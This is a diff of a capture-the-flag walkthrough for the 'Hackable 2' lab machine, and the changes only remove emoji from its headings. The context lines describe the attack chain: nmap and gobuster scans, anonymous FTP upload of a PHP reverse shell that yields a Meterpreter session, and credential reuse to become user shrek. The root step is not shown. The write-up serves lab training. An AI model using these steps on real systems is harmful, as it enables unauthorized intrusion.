@@ -1,8 +1,8 @@
-# 🐉 Hackable 2 CTF – Summary Walkthrough  
+#  Hackable 2 CTF – Summary Walkthrough  
 
 A full text-based breakdown of the Hackable 2 vulnerable machine. This box showcases misconfigured FTP services, web shell upload, horizontal privilege escalation through exposed credentials, and abusing Python binary privileges for root access.  
 
-## 🔍 Discovery  
+##  Discovery  
 - Ran `nmap` scans:  
 nmap -sV -Pn <ip>
 nmap -A <ip>
@@ -14,7 +14,7 @@ nmap -A <ip>
 
 ✅ Multiple exposed services provide several attack vectors.  
 
-## 📂 Enumeration  
+##  Enumeration  
 - Ran `gobuster` on port 80:  
 gobuster dir -u http://<ip>/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x txt,log,php,html,bak,zip
 
@@ -29,7 +29,7 @@ Password: (blank)
 
 ✅ Anonymous login was allowed and confirmed write permissions.  
 
-## ⚙️ Foothold  
+##  Foothold  
 - Uploaded PHP reverse shell via FTP into `/files`:  
 put shell.php
 
@@ -45,7 +45,7 @@ http://<ip>/files/shell.php
 
 ✅ Meterpreter reverse shell established as `www-data`.  
 
-## 💻 User Escalation (www-data → shrek)  
+##  User Escalation (www-data → shrek)  
 - Found `/home/important.txt` → referenced a script `runme.sh`.  
 - Ran the script:  
 ./runme.sh
@@ -57,7 +57,7 @@ su shrek
 
 ✅ Access as user `shrek`.  
 
-## 🔐 Privilege Escalation (shrek → root)  
+##  Privilege Escalation (shrek → root)  
 - Checked sudo privileges:  
 sudo -l
 
